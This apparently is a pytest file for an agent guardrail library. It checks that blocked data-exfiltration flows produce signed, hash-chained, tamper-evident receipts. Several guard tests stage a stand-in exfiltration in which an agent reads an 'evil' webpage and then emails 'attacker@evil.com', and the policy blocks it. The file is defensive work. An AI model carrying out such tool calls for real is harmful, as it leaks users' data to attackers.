"""Tests for signed, hash-chained flow-block receipts (in-process)."""

from __future__ import annotations

from pathlib import Path

import pytest

import agentbrake
from agentbrake import AgentBrakeInterrupt, InterruptReason, block_exfiltration, receipts, signing
from agentbrake.server import attest
from agentbrake.types import RunState, ToolCall

TEST_SIGNER = signing.Ed25519Signer.from_seed(b"\x03" * 32)


@pytest.fixture(autouse=True)
def _fixed_key(monkeypatch: pytest.MonkeyPatch):
    """Pin the signing key so receipts verify deterministically."""
    monkeypatch.setattr(attest, "SIGNER", TEST_SIGNER)


def _flow(sink: str = "send_email") -> dict:
    return {
        "sink": sink,
        "sink_category": "egress",
        "violated_taints": ["untrusted"],
        "tainted_by": [
            {"label": "untrusted", "source_tool": "read_webpage", "call_index": 0}
        ],
    }


# --- minting / signing / chaining (unit) ----------------------------------

def test_mint_produces_signed_chained_receipt():
    ledger = receipts.InMemoryLedger()
    state = RunState()
    row = receipts.mint_flow_receipt(
        ledger, run_state=state, sink_call=ToolCall(name="send_email"), flow=_flow()
    )
    assert row["seq"] == 1
    assert row["prev_hash"] == receipts.GENESIS_HASH
    att = row["attestation"]
    assert att["kind"] == "flow_block"
    assert att["decision"] == "block"
    assert att["reason"] == "flow"
    assert att["tool"] == "send_email"
    assert att["tool_args_digest"].startswith("sha256:")

    ok, error = receipts.verify_chain(ledger.all())
    assert ok, error
    # Third-party check: the signature verifies under the public key alone.
    public_keys = {TEST_SIGNER.key_id: TEST_SIGNER.public_key_hex()}
    ok, error = receipts.verify_chain(ledger.all(), public_keys=public_keys)
    assert ok, error


def test_multiple_blocks_chain_linearly():
    ledger = receipts.InMemoryLedger()
    state = RunState()
    for _ in range(3):
        receipts.mint_flow_receipt(
            ledger, run_state=state, sink_call=ToolCall(name="send_email"), flow=_flow()
        )
    chain = ledger.all()
    assert [r["seq"] for r in chain] == [1, 2, 3]
    assert chain[0]["prev_hash"] == receipts.GENESIS_HASH
    assert chain[1]["prev_hash"] == chain[0]["entry_hash"]
    assert chain[2]["prev_hash"] == chain[1]["entry_hash"]
    ok, error = receipts.verify_chain(chain)
    assert ok, error


def test_tampering_breaks_the_receipt():
    ledger = receipts.InMemoryLedger()
    state = RunState()
    receipts.mint_flow_receipt(
        ledger, run_state=state, sink_call=ToolCall(name="send_email"), flow=_flow()
    )
    chain = ledger.all()
    # Rewrite the signed body without the key; verification must fail.
    chain[0]["attestation_json"] = chain[0]["attestation_json"].replace(
        '"decision":"block"', '"decision":"allow"'
    )
    ok, error = receipts.verify_chain(chain)
    assert ok is False
    assert "signature" in error


def test_concurrent_mints_do_not_fork_the_chain():
    """Regression: tail-read -> append was not atomic, so two threads could
    both mint seq N+1 and fork the chain. Minting is now serialized."""
    import threading

    ledger = receipts.InMemoryLedger()
    state = RunState()
    n_threads, per_thread = 8, 5

    def mint_many():
        for _ in range(per_thread):
            receipts.mint_flow_receipt(
                ledger, run_state=state, sink_call=ToolCall(name="send_email"), flow=_flow()
            )

    threads = [threading.Thread(target=mint_many) for _ in range(n_threads)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    chain = ledger.all()
    assert [r["seq"] for r in chain] == list(range(1, n_threads * per_thread + 1))
    ok, error = receipts.verify_chain(chain)
    assert ok, error


# --- durable JsonlLedger --------------------------------------------------

def test_jsonl_ledger_persists_and_reverifies(tmp_path: Path):
    path = str(tmp_path / "receipts.jsonl")
    state = RunState()
    ledger = receipts.JsonlLedger(path)
    receipts.mint_flow_receipt(
        ledger, run_state=state, sink_call=ToolCall(name="send_email"), flow=_flow()
    )
    receipts.mint_flow_receipt(
        ledger, run_state=state, sink_call=ToolCall(name="http_post"), flow=_flow("http_post")
    )

    # A brand-new ledger pointed at the same file sees the same chain.
    reloaded = receipts.JsonlLedger(path)
    chain = reloaded.all()
    assert [r["seq"] for r in chain] == [1, 2]
    ok, error = receipts.verify_chain(chain)
    assert ok, error


# --- wired into guard -----------------------------------------------------

@pytest.fixture(autouse=True)
def _isolate_default_run():
    agentbrake._default_run = None
    yield
    agentbrake._default_run = None


@agentbrake.guard()
def dispatch(name: str, args: dict) -> str:
    return f"{name}-ok"


def test_flow_block_attaches_a_verifiable_receipt():
    policy = block_exfiltration(
        untrusted_readers=["read_webpage"], egress_tools=["send_email"]
    )
    with agentbrake.run(
        allowed_tools=["read_webpage", "send_email"],
        budget_usd=10.0,
        flow_policy=policy,
    ) as r:
        dispatch("read_webpage", {"url": "http://evil"})
        with pytest.raises(AgentBrakeInterrupt) as ei:
            dispatch("send_email", {"to": "attacker@evil.com"})

    assert ei.value.reason is InterruptReason.FLOW
    receipt = ei.value.context["receipt"]
    assert receipt["seq"] == 1
    assert receipt["attestation"]["tool"] == "send_email"
    assert receipt["attestation"]["run_id"] == r.state.run_id

    # The receipt is in the run's ledger and the chain verifies.
    assert len(r.flow_receipts()) == 1
    ok, error = r.verify_receipts()
    assert ok, error


def test_each_blocked_flow_extends_the_chain():
    policy = block_exfiltration(
        untrusted_readers=["read_webpage"], egress_tools=["send_email"]
    )
    with agentbrake.run(
        allowed_tools=["read_webpage", "send_email"],
        budget_usd=10.0,
        flow_policy=policy,
    ) as r:
        dispatch("read_webpage", {"url": "http://evil"})
        for _ in range(2):
            with pytest.raises(AgentBrakeInterrupt):
                dispatch("send_email", {"to": "attacker@evil.com"})

    assert [row["seq"] for row in r.flow_receipts()] == [1, 2]
    ok, error = r.verify_receipts()
    assert ok, error


def test_non_flow_interrupts_mint_no_receipt():
    with agentbrake.run(allowed_tools=["search"], budget_usd=10.0) as r:
        with pytest.raises(AgentBrakeInterrupt) as ei:
            dispatch("delete_db", {})  # escalation, not a flow block
    assert ei.value.reason is InterruptReason.ESCALATION
    assert "receipt" not in ei.value.context
    assert r.flow_receipts() == []
